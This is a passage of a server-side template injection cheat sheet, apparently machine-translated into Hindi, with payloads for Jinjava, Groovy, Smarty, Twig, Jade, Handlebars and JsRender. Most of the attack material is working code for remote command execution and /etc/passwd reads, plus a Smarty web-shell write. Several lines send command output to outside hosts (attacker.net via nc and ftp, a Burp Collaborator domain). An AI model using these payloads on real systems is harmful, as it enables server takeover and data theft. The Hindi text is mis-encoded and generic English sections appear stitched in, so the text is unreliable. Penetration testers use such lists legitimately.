рдЗрд╕рд▓рд┐рдП, рдЬрдм рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ Jinjava рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХреЛрдб рдХреА рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА рдЬрд╛рддреА рд╣реИред
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╣реИ рдЬрд┐рд╕реЗ Hubspot рдиреЗ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИ, рдЬреЛ [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред

**Jinjava - рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230) рджреНрд╡рд╛рд░рд╛ рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ред
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (рдЬрд╛рд╡рд╛)

* `{% %}` рдмрдпрд╛рди рдЕрд▓рдЧрдХрд░рдг
* `{{ }}` рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдЕрд▓рдЧрдХрд░рдг
* `{# #}` рдЯрд┐рдкреНрдкрдгреА рдЕрд▓рдЧрдХрд░рдг
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest" рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХреА рдФрд░ [Github рдкрд░ Jinjava рдкреНрд░реЛрдЬреЗрдХреНрдЯ](https://github.com/HubSpot/jinjava/) рдХреА рдЦреЛрдЬ рдХреАред
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рднрд╛рд╖рд╛ - EL (рдЬрд╛рд╡рд╛)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

EL, рдЬреИрд╕реЗ рдХрд┐ JavaServer Faces рддрдХрдиреАрдХ, JavaServer Pages (JSP) рддрдХрдиреАрдХ, рдФрд░ Contexts and Dependency Injection for Java EE (CDI) рдЬреИрд╕реА рдХрдИ JavaEE рддрдХрдиреАрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрдВрддреНрд░ рд╣реИред\
EL рдХрд╛ рдЙрдкрдпреЛрдЧ **EL рдЗрдВрдЯрд░рдкреНрд░рд┐рдЯрд░реНрд╕ рдХреЗ рд╢реЛрд╖рдг** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### рдЧреНрд░реВрд╡реА (рдЬрд╛рд╡рд╛)

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдмрд╛рдИрдкрд╛рд╕ рдЗрд╕ [**рд▓реЗрдЦ**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд╛рди рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) рдХреЗ Smarty рдЦрдВрдб рдореЗрдВ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = рддреНрд░реБрдЯрд┐`
* `{{foobar}} рдХреБрдЫ рдирд╣реАрдВ`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рд╛рд░реВрдк**

Twig рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рд╣реИ рдЬрд┐рд╕реЗ PHP рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЕрд▓рдЧрд╛рд╡рд╡рд╛рджреА рдЯреЗрдореНрдкрд▓реЗрдЯ рднрд╛рд╖рд╛ рд╣реИ рдЬреЛ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдбрд╛рдЯрд╛ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред Twig рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ `.twig` рдирд╛рдордХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ Twig рдХреЛрдб рдХреЛ рдмреНрд▓реЙрдХреЛрдВ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ `{{ }}` рдФрд░ `{% %}` рджреНрд╡рд╛рд░рд╛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `{{ }}` рдЪрд┐рд╣реНрдиреЛрдВ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдбреЗрдЯрд╛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ `{% %}` рдЪрд┐рд╣реНрдиреЛрдВ рдХреЗ рдмреАрдЪ рдореЗрдВ рд▓реЙрдЬрд┐рдХрд▓ рд╡реНрдпрд╡рд╣рд╛рд░ рдФрд░ рдирд┐рдпрдо рд▓рд┐рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВред Twig рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рдВрдХреНрд╢рди, рдлрд╝рд┐рд▓реНрдЯрд░ рдФрд░ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рднреА рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

Twig рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди (SSTI) рд╣рдорд▓реЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреМрд╢рд▓ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред SSTI рд╣рдорд▓реЛрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛, рдЖрдк рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЕрджреНрдпрддрд┐рдд рдХреЛрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ Twig рдХреЛрдб рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрддрд╛ рд╣реИред
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) рдХреЗ Twig рдФрд░ Twig (Sandboxed) рдЕрдиреБрднрд╛рдЧ рдореЗрдВ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates, Twig рд╕реЗ рдкреНрд░реЗрд░рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдПрдХ рдХрдВрдкрд╛рдЗрд▓ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреА рдмрдЬрд╛рдп рдПрдХ рдореВрд▓ PHP рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рд╣реИред

рдирд┐рдпрдВрддреНрд░рдХ:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
рдкреГрд╖реНрда рдЯреЗрдореНрдкрд▓реЗрдЯ:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
рд▓реЗрдЖрдЙрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlib рдФрд░ HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) PHPlib рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди Pear рдореЗрдВ рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

## Introduction

Server-Side Template Injection (SSTI) is a vulnerability that occurs when an application allows user input to be directly embedded into a template or executed as code in a template engine. This can lead to remote code execution (RCE) and other security risks.

## Exploiting SSTI in `authors.php`

In the `authors.php` file, there may be a potential SSTI vulnerability. This vulnerability can be exploited by injecting malicious code into the template engine used by the application.

To exploit this vulnerability, follow these steps:

1. Identify the template engine used by the application. Common template engines include Twig, Smarty, and Jinja2.

2. Craft a payload that will execute arbitrary code within the template engine. This payload will depend on the specific template engine being used.

3. Inject the payload into the user input field or parameter that is being used in the template.

4. Submit the payload and observe the response. If the payload is executed as code, you have successfully exploited the SSTI vulnerability.

## Prevention

To prevent SSTI vulnerabilities, follow these best practices:

- **Input Validation**: Always validate and sanitize user input before using it in a template. This can help prevent malicious code from being executed.

- **Contextual Output Encoding**: When outputting user input in a template, use contextual encoding to ensure that any special characters are properly escaped. This can help prevent code injection attacks.

- **Template Engine Configuration**: Configure the template engine to use a sandboxed environment that restricts the execution of arbitrary code. This can help mitigate the impact of an SSTI vulnerability.

- **Regular Updates**: Keep the template engine and any associated libraries up to date to ensure that any security patches are applied.

By following these best practices, you can reduce the risk of SSTI vulnerabilities in your application.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade is a popular template engine for NodeJS. It is used to generate HTML markup with the help of a simple and concise syntax. Jade templates are compiled into JavaScript functions that can be executed on the server-side to generate dynamic HTML content.

#### Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) is a vulnerability that occurs when user-supplied input is directly embedded into a template engine without proper sanitization or validation. This can lead to arbitrary code execution on the server, allowing an attacker to perform various malicious activities such as data exfiltration, remote code execution, or even complete server compromise.

#### Exploiting SSTI in Jade

To exploit SSTI in Jade, an attacker needs to identify the injection point and craft a payload that can execute arbitrary code. The injection point can be found in variables, attributes, or function calls within the template.

Here is an example of a vulnerable Jade template:

```jade
doctype html
html
  head
    title= pageTitle
  body
    h1= pageTitle
    p Welcome to #{pageTitle}
```

In this example, the `pageTitle` variable is directly embedded into the template without any sanitization. An attacker can exploit this by injecting code into the `pageTitle` variable, which will be executed on the server-side.

To mitigate SSTI vulnerabilities in Jade, it is important to properly sanitize and validate user input before embedding it into the template. Input validation should include checking for malicious characters or patterns that could lead to code execution.

#### Conclusion

SSTI vulnerabilities in Jade can have serious consequences, allowing attackers to execute arbitrary code on the server-side. It is crucial to implement proper input validation and sanitization to prevent such vulnerabilities. Regularly updating Jade and other dependencies is also important to stay protected against known vulnerabilities.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) рдХреЗ Jade рдЦрдВрдб рдореЗрдВ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) рдПрдХ PHP рдЯреЗрдореНрдкрд▓реЗрдЯрд┐рдВрдЧ рдЗрдВрдЬрди рд╣реИ, рдЬреЛ XML рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рднрд╛рдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИред
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/) рдореЗрдВ)ред
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= рддреНрд░реБрдЯрд┐
* ${7\*7} = ${7\*7}
* рдХреБрдЫ рдирд╣реАрдВ
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **рдЯреЗрдореНрдкрд▓реЗрдЯ** | **рд╡рд┐рд╡рд░рдг**                         |
| ------------ | --------------------------------------- |
|              | рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рд░реЗрдВрдбрд░ рдХрд░реЗрдВ              |
|              | рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ HTML рдПрдирдХреЛрдбреЗрдб рдЖрдЙрдЯрдкреБрдЯ рд░реЗрдВрдбрд░ рдХрд░реЗрдВ |
|              | рдЯрд┐рдкреНрдкрдгреА                                 |
| рдФрд░          | рдХреЛрдб рдХреА рдЕрдиреБрдорддрд┐ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо)        |

* \= 49

**рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
